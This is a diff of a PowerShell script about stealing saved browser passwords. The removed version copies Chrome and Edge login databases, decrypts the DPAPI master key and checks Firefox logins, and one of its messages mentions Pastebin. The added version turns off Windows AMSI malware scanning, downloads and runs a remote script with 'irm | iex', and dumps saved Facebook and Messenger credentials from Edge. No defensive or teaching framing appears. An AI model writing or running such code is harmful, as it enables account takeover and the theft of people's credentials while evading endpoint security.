@@ -1,110 +1,11 @@
-# Force TLS + load assemblies
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-Add-Type -AssemblyName System.Web, System.Security
+# Temp disable AMSI if Defender blocks (common on these scripts - your machine, your call)
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-# Function to get Chromium (Chrome/Edge) passwords - simplified local print version
-function Get-ChromiumPasswords {
-    param (
-        [string]$Browser = "Chrome",
-        [string]$BasePath
-    )
+# Load Invoke-PowerChrome directly from GitHub (no install)
+irm https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/main/Invoke-PowerChrome.ps1 | iex
 
-    Write-Host "=== Trying $Browser ===" -ForegroundColor Cyan
-    $loginPath = Join-Path $BasePath "Login Data"
-    $statePath = Join-Path (Split-Path $BasePath) "Local State"
-
-    if (-not (Test-Path $loginPath)) {
-        Write-Host "No Login Data found for $Browser. Path: $loginPath" -ForegroundColor Yellow
-        return
-    }
-
-    # Temp copies
-    $tempLogin = "$env:TEMP\LoginData_$Browser"
-    $tempState = "$env:TEMP\LocalState_$Browser"
-    try {
-        Copy-Item $loginPath $tempLogin -Force
-        Copy-Item $statePath $tempState -Force
-        Write-Host "Copied files OK" -ForegroundColor Green
-    } catch {
-        Write-Host "Copy failed (browser open or locked?): $($_.Exception.Message)" -ForegroundColor Red
-        return
-    }
-
-    # Get master key
-    $localState = Get-Content $tempState -Raw | ConvertFrom-Json -ErrorAction SilentlyContinue
-    $encKeyB64 = $localState.os_crypt.encrypted_key
-    if (-not $encKeyB64) {
-        Write-Host "No encrypted_key in Local State" -ForegroundColor Yellow
-        Remove-Item $tempLogin, $tempState -Force -ErrorAction SilentlyContinue
-        return
-    }
-
-    $encKey = [Convert]::FromBase64String($encKeyB64)
-    if ($encKey[0..4] -join '' -eq 'DPAPI') {
-        try {
-            $masterKey = [Security.Cryptography.ProtectedData]::Unprotect($encKey[5..($encKey.Length-1)], $null, 'CurrentUser')
-            Write-Host "Master key decrypted OK (length $($masterKey.Length) bytes)" -ForegroundColor Green
-        } catch {
-            Write-Host "DPAPI unprotect failed: $($_.Exception.Message)" -ForegroundColor Red
-            Remove-Item $tempLogin, $tempState -Force -ErrorAction SilentlyContinue
-            return
-        }
-    } else {
-        Write-Host "Unknown key format (not DPAPI)" -ForegroundColor Yellow
-        Remove-Item $tempLogin, $tempState -Force -ErrorAction SilentlyContinue
-        return
-    }
-
-    # Note: Full password decrypt needs SQLite query + AES-GCM (V10+ keys)
-    # Pure PS without DLL/module can't query SQLite easily, so print status only
-    Write-Host "Login Data exists and master key ready. Full dump needs SQLite interop (e.g. Install-Module Read-Chromium or external tool)." -ForegroundColor Yellow
-    Write-Host "Rows exist? Check manually or add module for SELECT origin_url, username_value, password_value FROM logins" -ForegroundColor Yellow
-    Write-Host "Temp files kept for debug: $tempLogin and $tempState" -ForegroundColor Magenta
-
-    # Cleanup after (comment out if you want to keep for more checks)
-    # Remove-Item $tempLogin, $tempState -Force -ErrorAction SilentlyContinue
-}
-
-# Firefox basic check
-function Get-FirefoxPasswords {
-    Write-Host "=== Firefox Check ===" -ForegroundColor Cyan
-    $profiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
-    if (-not (Test-Path $profiles)) {
-        Write-Host "No Firefox install found" -ForegroundColor Yellow
-        return
-    }
-
-    $profile = Get-ChildItem $profiles -Directory | Where-Object { $_.Name -like "*.default*" } | Select -First 1
-    if (-not $profile) {
-        Write-Host "No default profile" -ForegroundColor Yellow
-        return
-    }
-
-    $loginsJson = Join-Path $profile.FullName "logins.json"
-    if (Test-Path $loginsJson) {
-        $logins = Get-Content $loginsJson -Raw | ConvertFrom-Json -ErrorAction SilentlyContinue
-        if ($logins.logins) {
-            Write-Host "Found $($logins.logins.Count) logins in logins.json" -ForegroundColor Green
-            Write-Host "Note: If no master password, they are decryptable; else need NSS libs. Pure PS hard." -ForegroundColor Yellow
-        } else {
-            Write-Host "logins.json empty or invalid" -ForegroundColor Yellow
-        }
-    } else {
-        Write-Host "No logins.json in profile" -ForegroundColor Yellow
-    }
-}
-
-# Run all
-Clear-Host
-Write-Host "Starting browser password check - $(Get-Date)" -ForegroundColor White
-
-$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
-Get-ChromiumPasswords -Browser "Chrome" -BasePath $chromePath
-
-$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
-Get-ChromiumPasswords -Browser "Edge" -BasePath $edgePath
-
-Get-FirefoxPasswords
-
-Write-Host "`nDone. If no real passwords printed above, that's why Pastebin was empty." -ForegroundColor White
-Write-Host "Common issues: Browser open = copy fail | No saved logins | Need module for full decrypt (try Install-Module Read-Chromium)" -ForegroundColor Cyan
+# Dump ONLY Facebook-related creds from Edge and print
+Invoke-PowerChrome -Browser Edge -Verbose | 
+    Where-Object { $_.origin_url -match 'facebook\.com|fb\.com|messenger\.com' } | 
+    Select-Object origin_url, username_value, password | 
+    Format-Table -AutoSize
